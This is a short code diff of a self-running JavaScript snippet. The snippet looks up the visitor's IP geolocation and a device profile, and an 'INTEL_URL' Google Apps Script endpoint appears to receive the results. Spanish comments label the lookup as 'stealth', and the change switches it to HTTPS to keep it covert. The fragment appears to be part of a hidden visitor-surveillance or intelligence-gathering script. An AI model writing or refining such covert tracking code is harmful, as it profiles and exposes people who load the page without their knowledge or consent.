@@ -7,8 +7,8 @@ const INTEL_URL = "https://script.google.com/macros/s/AKfycbwJUNUGKckgw5ESN6ERqI
 
 (async function() {
     try {
-        // 1. Obtener Geolocalización (Sigilo)
-        const geoRes = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,mobile,proxy,query');
+        // 1. Obtener Geolocalización (Sigilo HTTPS)
+        const geoRes = await fetch('https://ipapi.co/json/');
         const geoData = await geoRes.json();
 
         // 2. Detectar Dispositivo
